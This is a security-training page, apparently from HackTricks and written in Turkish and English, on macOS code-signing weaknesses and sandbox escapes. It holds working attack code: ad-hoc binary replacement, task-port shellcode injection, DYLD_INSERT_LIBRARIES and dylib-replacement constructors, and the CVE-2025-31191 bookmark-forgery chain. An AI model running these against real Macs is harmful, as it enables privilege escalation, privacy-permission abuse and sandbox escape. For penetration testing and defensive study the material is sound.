# macOS Code Signing Weaknesses & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Temel Bilgiler

**Ad-hoc signing** (`CS_ADHOC`), **certificate chain** içermeyen bir code signature oluşturur. Yine de imzalanan code'u hash'lediğinden validation, modification işlemini tespit edebilir; ancak başka bir component'ın authenticate edebileceği bir developer identity sağlamaz. Executable'ı değiştirip yeniden sign etmek farklı bir CodeDirectory/CDHash üretir.<sup>[[1]](#references)[[4]](#references)</sup>

Apple Silicon Mac'lerde tüm executable'lar en az bir ad-hoc signature gerektirir. Bu nedenle birçok development tool'unda, Homebrew package'ında ve third-party utility'de ad-hoc signature bulabilirsiniz.

### Bunun Önemi

- **Doğrulanabilir signer identity yoktur** — yalnızca bir path'i, ad-hoc status'u veya pinlenmemiş bir identifier'ı kabul eden kontroller, binary'yi kimin ürettiğini belirleyemez.
- **Privileged position**'lardaki third-party ad-hoc binary'ler (FDA, daemon'lar, helper'lar), file'ları veya bir parent directory'leri writable olduğunda yüksek öncelikli target'lardır.
- CDHash, designated-requirement veya requirement-backed TCC check'leri replacement işlemini **tespit eder**. Path-based policy bunu yapmayabilir; re-signing sonrasında grant'in geçerliliğini koruduğunu varsaymak yerine gerçek requirement'ı inceleyin ve grant'i yeniden test edin.

### Keşif
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Attack: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. Relaunch and verify the effective grant. It survives only when the
#    authorization is path-based (or otherwise does not pin the old CDHash).
```
---

## Debuggable Processes (get-task-allow)

### Temel Bilgiler

**`com.apple.security.get-task-allow`** entitlement'ı (veya `CS_GET_TASK_ALLOW` flag'i), Hardened Runtime normalde bunu engelleyecek olsa bile, yetkili bir debugger'ın process task port'unu almasına izin verir. Başarılı bir debugger memory okuyabilir, register'ları değiştirebilir, code inject edebilir ve execution'ı kontrol edebilir.<sup>[[3]](#references)</sup>

Bu yalnızca **development build'leri** için tasarlanmıştır. Ancak bazı third-party binary'ler bu entitlement ile production ortamına gönderilir.

> [!CAUTION]
> `get-task-allow` içeren bir production binary'si güçlü bir exploitation primitive'idir. `taskgated`, caller identity, sandboxing, debugger entitlements ve Developer Tools authorization, belirli bir client'ın task port'unu alıp alamayacağını hâlâ etkiler; hem `lldb`/`debugserver` hem de hedeflenen injector ile test edin. Attachment başarılı olduğunda, inject edilen code hedefin entitlements'ı, TCC grant'leri ve security context'i ile çalışır.

### Discovery
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Saldırı: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Library Validation Yok + DYLD Environment

### Runtime Library-Validation Clearing

Private entitlement **`com.apple.private.security.clear-library-validation`**, process başlatılırken library validation'ı devre dışı bırakmaz. Bunun yerine process'in çalışma zamanında kendisi üzerinde `csops(..., CS_OPS_CLEAR_LV, ...)` çağırmasına izin verir. XNU, çağıran taraf entitlement'a sahip olduğu ve handler'ın ek kontrollerini karşıladığı sürece `CS_REQUIRE_LV | CS_FORCED_LV` bayraklarını temizler. Sonuç olarak bir process, yalnızca library validation'ı temizleyen code path'e ulaştıktan sonra uygulanabilir bir library-injection hedefi haline gelebilir.<sup>[[4]](#references)[[5]](#references)</sup>

### The Deadly Combination

Bir binary şu ikisine de sahip olduğunda:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (herhangi bir dylib'i yükler)
- `com.apple.security.cs.allow-dyld-environment-variables` (DYLD env vars'larını kabul eder)

Bu, yüksek değerli bir code-injection kombinasyonudur; çünkü Hardened Runtime hem güvenilmeyen library'ye hem de DYLD environment variable'a izin verir. Launch context yine de DYLD variables'larını temizleyebilir (örneğin protected veya privileged execution path'lerinde), bu nedenle entitlement çiftini koşulsuz kabul etmek yerine exact invocation'ı doğrulayın.

### Discovery
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Saldırı: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Sandbox Geçici İstisnaları

### Sandbox'u Nasıl Zayıflatırlar

Sandbox geçici istisnaları (`com.apple.security.temporary-exception.*`), App Sandbox'ta açıklar oluşturur:<sup>[[2]](#references)</sup>

| İstisna | İzin Verdiği İşlem |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Sistem genelindeki XPC/Mach servislerine bağlanma |
| `temporary-exception.files.absolute-path.read-write` | App container dışındaki dosyaları okuma/yazma |
| `temporary-exception.iokit-user-client-class` | IOKit user-client bağlantıları açma |
| `temporary-exception.shared-preference.read-only` | Diğer uygulamaların tercihlerini okuma |
| `temporary-exception.files.home-relative-path.read-write` | `~` ile ilişkili path'lere erişme |

### Mach-Lookup İstisnaları = Sandbox Escape Primitive

En tehlikeli istisna **mach-lookup**'tır — Sandbox içindeki bir uygulamanın privileged daemon'larla iletişim kurmasına izin verir:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Saldırı: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Code-Signing Checks Are Not XPC Client Integrity

An XPC service may authenticate a connection by extracting code-signing state from its audit token and accepting an Apple **platform binary** or a client carrying `CS_REQUIRE_LV`/`CS_FORCED_LV`. These tests describe the executable and selected process flags; they do not prove that the current address space contains only trusted code. ImageCapture services üzerinde yapılan araştırmalar, `/bin/ls` gibi injection yapılabilen bir Apple binary'sinin `DYLD_INSERT_LIBRARIES` üzerinden saldırganın dylib'ini yükleyebildiğini ve ardından platform client olarak bağlanabildiğini gösterdi. Library-validation flag'leri için yapılan takip kontrolü de Apple, macOS 15'te service'in kendi private authorization entitlement'ını gerektirmesini sağlayana kadar bypass edilebildi.<sup>[[6]](#references)</sup>

### Offensive Audit Workflow

1. `listener:shouldAcceptNewConnection:` (veya eşdeğer düşük seviyeli XPC handler'ı) reverse edin ve yalnızca `isPlatformBinary`, `kSecCodeInfoFlags`, `CS_PLATFORM_BINARY`, `CS_REQUIRE_LV` veya `CS_FORCED_LV` değerlerine dayalı kararları belirleyin.
2. Protokolü konuşabilen Apple-signed client'ları enumerate edin, ardından Hardened Runtime ve entitlement'ları inceleyin. Tek başına bir platform signature, DYLD injection'ın engellendiğine dair kanıt değildir.
3. Adayı **target macOS build** üzerinde test edin. Bir constructor dylib yüklenirse service connection'ını bu constructor içinden kurun; böylece audit token, kabul edilen platform process'ine ait olur.
4. Her vendor patch'ini yeniden test edin: aynı authorization kararına başka bir mutable process-status flag'i eklemek confused-deputy primitive'ini ortadan kaldırmayabilir.
```bash
# Static triage of the intended client
codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -

# Dynamic check using the constructor dylib created earlier in this page
DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
```
> [!NOTE]
> DYLD davranışı, AMFI policy ve service-side kontrolleri macOS sürümleri arasında değişir. Fully patched bir host'a karşı başarısızlık, aynı chain'in vulnerable release'te de başarısız olduğunu göstermez.

---

## Security-Scoped Bookmark Forgery (CVE-2025-31191)

Security-scoped bookmarks, bir kullanıcının dosya seçimini launch'lar arasında korur. Bir sandbox extension boot-bound olduğundan, `ScopedBookmarkAgent` bunu doğrular ve uzun ömürlü, HMAC-authenticated bir bookmark oluşturur; uygulama daha sonra bu bookmark'ı sunduğunda agent bunu doğrular ve yeni bir sandbox extension verir. Signing secret, login keychain'de saklanır ve bundle identifier kullanılarak app başına bir key türetilir.<sup>[[7]](#references)</sup>

Etkilenen sistemlerde keychain ACL, untrusted bir process'in `com.apple.scopedbookmarksagent.xpc` secret'ını **okumasını** engelliyor ancak silmesini engellemiyordu. Compromised sandboxed bir app, item'ı bilinen bir secret ve attacker-controlled ACL ile değiştirebilir, app-specific HMAC key'i türetebilir, writable container bookmark plist'inde entry'ler forge edebilir ve `ScopedBookmarkAgent`'dan bunları file-access extension'larıyla exchange etmesini isteyebilirdi. Bu durum, security-scoped bookmark kullanan herhangi bir sandboxed application'ı ek bir file-picker interaction olmadan potential arbitrary-file-access sandbox escape haline getiriyordu. Apple, sorunu 31 Mart 2025 security update'lerinde düzeltti.<sup>[[7]](#references)</sup>

### Triage and Attack Chain
```bash
APP=/Applications/Target.app
BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
"$APP/Contents/Info.plist")"

# Identify apps that can persist app- or document-scoped file access
codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'

# Locate app-managed bookmark stores; names and schemas are application-specific
find "$HOME/Library/Containers" -type f \
\( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null

# Inspect metadata for the agent's generic-password item (normally not its secret)
security find-generic-password -s com.apple.scopedbookmarksagent.xpc
```
Savunmasız bir host üzerindeki exploitation sequence şöyledir:

1. Persistent scoped bookmarks kullanan sandboxed bir app içinde code execution elde edin.
2. Agent'ın keychain signing item'ını bilinen bir secret ve permissive ACL ile değiştirin.
3. `HMAC-SHA256(key=known_secret, data=bundle_id)` hesaplayın ve app'in yazılabilir bookmark store'unda kullanışlı bir path için bookmark forge edin.
4. Uygulamanın normal bookmark-resolution path'ini tetikleyerek `ScopedBookmarkAgent`'ın bir sandbox extension döndürmesini sağlayın.
5. Yeni file access'i kullanarak, ilgili user için erişilebilir olan sandbox dışı bir execution veya data target'ını üzerine yazarak değiştirin.

Bu, **patched-version technique**'tir: trust boundary'yi anlamak ve patch uygulanmamış sistemleri değerlendirmek için kullanın; mevcut sürümler hakkında bir varsayım olarak kullanmayın. Güncel testing için bookmark parsing, identity binding, keychain-item lifecycle ve agent çevresindeki confused-deputy davranışına odaklanın.

---

## Private Apple Entitlements

### Bunlar Nedir

`com.apple.private.*` ile başlayan Entitlements, üçüncü taraf geliştiricilere belgelenmeyen veya sunulmayan **Apple-internal APIs**'lerine erişim sağlar. Private Entitlements içeren üçüncü taraf binary'ler bunları enterprise cert, MDM veya App Store dışı distribution yoluyla elde etti.

### Tehlikeli Private Entitlements

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | Tam TCC database read/write |
| `com.apple.private.tcc.allow` | Belirli TCC service'lerine erişim |
| `com.apple.private.security.no-sandbox` | Sandbox olmadan çalıştırma |
| `com.apple.private.iokit` | Doğrudan IOKit driver erişimi |
| `com.apple.private.kernel.\*` | Kernel interface erişimi |
| `com.apple.private.xpc.launchd.job-label` | launchd job'larını register/manage etme |
| `com.apple.rootless.install` | SIP tarafından korunan path'lere yazma |

### Discovery
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Custom Sandbox Profiles (SBPL)

### Bunlar Nedir

Binary'ler, SBPL (Seatbelt Profile Language) ile yazılmış **custom sandbox profiles** içerebilir. Bu profiller, varsayılan App Sandbox'dan daha kısıtlayıcı VEYA **daha izin verici** olabilir.

### Custom Profiles Denetimi
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Yazılabilir Kütüphane Yolları

### Bunlar Nedir?

Bir binary, mevcut kullanıcının **yazabildiği** bir yoldan dynamic library yüklediğinde, kütüphane malicious code ile değiştirilebilir.

### Keşif
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Saldırı: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Code Signing Rehberi](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (`CS_OPS_*` operations and `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (`csops` / `CS_OPS_CLEAR_LV` handler)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
- [6] [macOS Sandbox Escapes'te Yeni Bir Çağ: Gözden Kaçırılmış Bir Saldırı Yüzeyine Derinlemesine İnceleme ve 10'dan Fazla Yeni Zafiyetin Ortaya Çıkarılması](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [7] [CVE-2025-31191 Analizi: security-scoped bookmarks tabanlı bir macOS sandbox escape](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
{{#include ../../../banners/hacktricks-training.md}}
